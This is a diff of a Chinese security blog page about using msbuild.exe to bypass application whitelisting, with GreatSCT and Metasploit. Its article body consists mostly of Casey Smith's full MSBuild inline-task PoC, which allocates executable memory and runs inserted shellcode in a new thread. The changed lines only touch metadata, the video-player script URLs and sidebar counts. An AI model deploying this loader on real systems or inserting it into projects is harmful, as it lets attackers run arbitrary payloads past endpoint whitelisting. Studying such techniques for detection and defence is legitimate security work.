@@ -55,7 +55,7 @@
 <meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1515069148854.jpg">
 <meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1515069394562.jpg">
 <meta property="og:image" content="http://ojg8j426f.bkt.clouddn.com/1515068637863.jpg">
-<meta property="og:updated_time" content="2018-01-04T12:38:09.000Z">
+<meta property="og:updated_time" content="2018-10-04T02:20:47.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="GreatSCT | MSF  | 白名单">
 <meta name="twitter:image" content="http://ojg8j426f.bkt.clouddn.com/C748EF6C45A33504B55D8087C89D45BA.png">
@@ -447,7 +447,7 @@
       
         <span itemprop="articleBody"><p><img src="http://ojg8j426f.bkt.clouddn.com/C748EF6C45A33504B55D8087C89D45BA.png" alt="enter description here"><br><a id="more"></a><br>Github <a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">https://github.com/GreatSCT/GreatSCT</a></p>
 <h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
+<script type="text/javascript" src="http://oc78wb8cz.bkt.clouddn.com/cytron.core.js"></script>
 <script>
     var ivaInstance = new Iva('ivaLive', {
         appkey: 'By9WGzBIx', //应用标示
@@ -456,7 +456,7 @@
         cover: '' //视频封面，只有在autoplay:false才可生效
     });
 </script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
+<script src="http://oc78wb8cz.bkt.clouddn.com/lva.js"></script>
 
 <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Casey Smith 发现了一个名为“msbuild.exe”的微软二进制文件。他在2016年9月13日星期二写了一篇博客，标题为“使用MSBuild.exe绕过应用程序白名单 - 设备保护示例和缓解措施”。他的博客已经不存在了，但是你可以在这里通过archive.org访问它 <a href="https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html" target="_blank" rel="noopener">https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html</a></p>
 <h2 id="2-POC-code"><a href="#2-POC-code" class="headerlink" title="2.POC  -code"></a>2.POC  -code</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;Project ToolsVersion=<span class="string">"4.0"</span> xmlns=<span class="string">"http://schemas.microsoft.com/developer/msbuild/2003"</span>&gt;</span><br><span class="line">         &lt;!-- This inline task executes shellcode. --&gt;</span><br><span class="line">         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.<span class="number">0.30319</span>\msbuild<span class="selector-class">.exe</span> SimpleTasks<span class="selector-class">.csproj</span> --&gt;</span><br><span class="line">         &lt;!-- Save This File And Execute The Above Command --&gt;</span><br><span class="line">         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span><br><span class="line">         &lt;!-- License: BSD <span class="number">3</span>-Clause --&gt;</span><br><span class="line">	  &lt;Target Name=<span class="string">"Hello"</span>&gt;</span><br><span class="line">	    &lt;ClassExample /&gt;</span><br><span class="line">	  &lt;/Target&gt;</span><br><span class="line">	  &lt;UsingTask</span><br><span class="line">	    TaskName=<span class="string">"ClassExample"</span></span><br><span class="line">	    TaskFactory=<span class="string">"CodeTaskFactory"</span></span><br><span class="line">	    AssemblyFile=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"</span> &gt;</span><br><span class="line">	    &lt;Task&gt;</span><br><span class="line">	    </span><br><span class="line">	      &lt;Code Type=<span class="string">"Class"</span> Language=<span class="string">"cs"</span>&gt;</span><br><span class="line">	      &lt;![CDATA[</span><br><span class="line">		using System;</span><br><span class="line">		using System.Runtime.InteropServices;</span><br><span class="line">		using Microsoft.Build.Framework;</span><br><span class="line">		using Microsoft.Build.Utilities;</span><br><span class="line">		public class ClassExample :  Task, ITask</span><br><span class="line">		&#123;         </span><br><span class="line">		  private static UInt32 MEM_COMMIT = 0x1000;          </span><br><span class="line">		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          </span><br><span class="line">		  [DllImport(<span class="string">"kernel32"</span>)]</span><br><span class="line">		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">		  [DllImport(<span class="string">"kernel32"</span>)]</span><br><span class="line">		    private static extern IntPtr CreateThread(            </span><br><span class="line">		    UInt32 lpThreadAttributes,</span><br><span class="line">		    UInt32 dwStackSize,</span><br><span class="line">		    UInt32 lpStartAddress,</span><br><span class="line">		    IntPtr param,</span><br><span class="line">		    UInt32 dwCreationFlags,</span><br><span class="line">		    ref UInt32 lpThreadId           </span><br><span class="line">		    );</span><br><span class="line">		  [DllImport(<span class="string">"kernel32"</span>)]</span><br><span class="line">		    private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">		    IntPtr hHandle,</span><br><span class="line">		    UInt32 dwMilliseconds</span><br><span class="line">		    );          </span><br><span class="line">		  public override bool Execute()</span><br><span class="line">		  &#123;</span><br><span class="line">		    byte[] shellcode = new byte[] &#123; INSERT_SHELLCODE_HERE &#125;;</span><br><span class="line">		      </span><br><span class="line">		      UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode<span class="selector-class">.Length</span>,</span><br><span class="line">			MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">		      IntPtr hThread = IntPtr.Zero;</span><br><span class="line">		      UInt32 threadId = 0;</span><br><span class="line">		      IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">		      WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">		      return true;</span><br><span class="line">		  &#125; </span><br><span class="line">		&#125;     </span><br><span class="line">	      ]]&gt;</span><br><span class="line">	      &lt;/Code&gt;</span><br><span class="line">	    &lt;/Task&gt;</span><br><span class="line">	  &lt;/UsingTask&gt;</span><br><span class="line">	&lt;/Project&gt;</span><br></pre></td></tr></table></figure>
@@ -706,21 +706,21 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">130</span>
+              <span class="site-state-item-count">120</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
 
           <div class="site-state-item site-state-categories">
             
-              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-count">9</span>
               <span class="site-state-item-name">分类</span>
               
           </div>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">18</span>
+              <span class="site-state-item-count">14</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
